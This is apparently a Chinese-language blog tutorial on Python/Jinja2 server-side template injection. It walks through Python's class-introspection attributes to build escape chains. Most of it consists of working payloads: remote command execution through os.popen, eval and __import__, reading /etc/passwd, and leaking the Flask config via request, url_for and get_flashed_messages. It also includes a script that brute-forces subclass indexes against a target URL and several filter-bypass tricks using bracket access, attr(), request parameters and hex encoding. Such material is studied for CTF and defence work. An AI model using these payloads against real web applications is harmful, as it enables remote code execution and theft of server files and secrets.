<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Father</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">son</span>(<span class="params">Father,GrandFather</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(son.__base__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Father</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__bases__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__mro__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure>
<h3 id="subclasses"><code>__subclasses__()</code></h3>
<p>得到object类后，就可以用<code>__subclasses__()</code>获取所有的子类：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure>
<h3 id="dict"><code>__dict__</code></h3>
<p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p>
<p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p>
<p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="init"><code>__init__</code></h3>
<p><code>__init__</code>用于初始化类，作用就是为了得到function/method模型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x10cc23e50</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x10cc23ee0</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="globals"><code>__globals__</code></h3>
<p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>__init__</code>使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student object at <span class="number">0x10cc71880</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;function Student.__init__ at <span class="number">0x10cc23f70</span>&gt;</span><br></pre></td></tr></table></figure>
<p>果该关键字被过滤了我们可以使用<code>__getattribute__</code>，以下两者等效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__init__.__globals__[&#39;sys&#39;]</span><br><span class="line">__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;]</span><br></pre></td></tr></table></figure>
<h2 id="builtins、-builtin-、-builtins-的区别"><code>builtins</code>、<code>__builtin__</code>、<code>__builtins__</code>的区别</h2>
<p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p>
<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
<p>python2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>python3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h2 id="构造链的思路">构造链的思路</h2>
<h3 id="第一步">第一步</h3>
<p>使用<code>__class__</code>来获取内置类所对应的类，可以使用<code>str</code>，<code>dict</code>，<code>tuple</code>，<code>list</code>等来获取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="第二步">第二步</h3>
<p>拿到<code>object</code>基类</p>
<p>用<code>__bases__[0]</code>拿到基类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p>用<code>__base__</code>拿到基类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p>用<code>__mro__[1]</code>或<code>__mro__[-1]</code>拿到基类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="第三步">第三步</h3>
<p>用<code>__subclasses__()</code>拿到子类列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure>
<h3 id="第四步">第四步</h3>
<p>在子类列表中寻找中寻找可以getshell的类</p>
<h2 id="寻找利用链">寻找利用链</h2>
<p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p>
<p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子。</p>
<p>local_find.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num  = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__[<span class="number">0</span>].__subclasses__:</span><br><span class="line">  num += <span class="number">1</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">      print(num, i)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>运行这个脚本后：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219134702.png" alt=""></p>
<p>可以发现<code>object</code>基类的第132个子类名为<code>os._wrap_close</code>的这个类有popen方法</p>
<p>先调用它的<code>__init__</code>方法进行初始化类，再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值，最后调用<code>popen</code>函数来执行命令</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219135353.png" alt=""></p>
<p>但是上面的方法仅限于在本地寻找，remote_find.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  payload = <span class="string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span> % i</span><br><span class="line">  url = <span class="string">&quot;&quot;</span></span><br><span class="line">  r = requests.post(url + payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;catch_warnings&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(r.text)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="python3的方法">python3的方法</h3>
<h4 id="os-wrap-close类中的popen"><code>os._wrap_close</code>类中的<code>popen</code></h4>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="import-中的os"><code>__import__</code>中的<code>os</code></h4>
<p>把上面<code>local_find.py</code>脚本中的search变量换成<code>__import__</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140616.png" alt=""></p>
<p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="python2的方法">python2的方法</h3>
<p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219140835.png" alt=""></p>
<h4 id="file类读写文件"><code>file</code>类读写文件</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219141043.png" alt=""></p>
<p>然后直接调用里面的方法即可，payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="warnings类中的linecache"><code>warnings</code>类中的<code>linecache</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">58</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span>.<span class="title">__base__</span>.<span class="title">__subclasses__</span>()[59]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h3 id="python2和python3通用方法">python2和python3通用方法</h3>
<h4 id="builtins-代码执行"><code>__builtins__</code>代码执行</h4>
<p>把上面<code>local_find.py</code>脚本search变量赋值为<code>__builtins__</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201219142748.png" alt=""></p>
<p>再调用<code>eval</code>等函数和方法即可，payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用。</p>
<h4 id="os"><code>os</code></h4>
<p>这个我在python3.8环境下好像没能找到直接含有os的类，python2.7.18下有两个类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">&lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure>
<p>Payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取配置信息">获取配置信息</h3>
<h4 id="config">config</h4>
<p>通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息</p>
<h4 id="request">request</h4>
<p>jinja2中存在对象<code>request</code></p>
<p>查询一些配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>构造ssti的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="url-for">url_for</h4>
<p>查询配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>构造ssti的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="get-flashed-messages">get_flashed_messages</h4>
<p>查询配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>构造ssti的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Bypass">Bypass</h2>
<h3 id="过滤">过滤<code>.</code></h3>
<h4 id="绕过">[]绕过</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[&#39;__class__&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="attr-绕过"><code>attr()</code>绕过</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(&#39;__class__&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="getattr-绕过"><code>getattr()</code>绕过</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;getattr((),&quot;__class__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤引号">过滤引号</h3>
<p>五种不同的请求方式绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.values.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure>
<h4 id="GET">GET</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
<h4 id="POST">POST</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">POST:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
<h4 id="Cookie">Cookie</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
<h4 id="chr绕过">chr绕过</h4>
<h3 id="过滤-v2">过滤<code>_</code></h3>
<h4 id="编码绕过">编码绕过</h4>
<p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>关键字也可以使用十六进制编码</p>
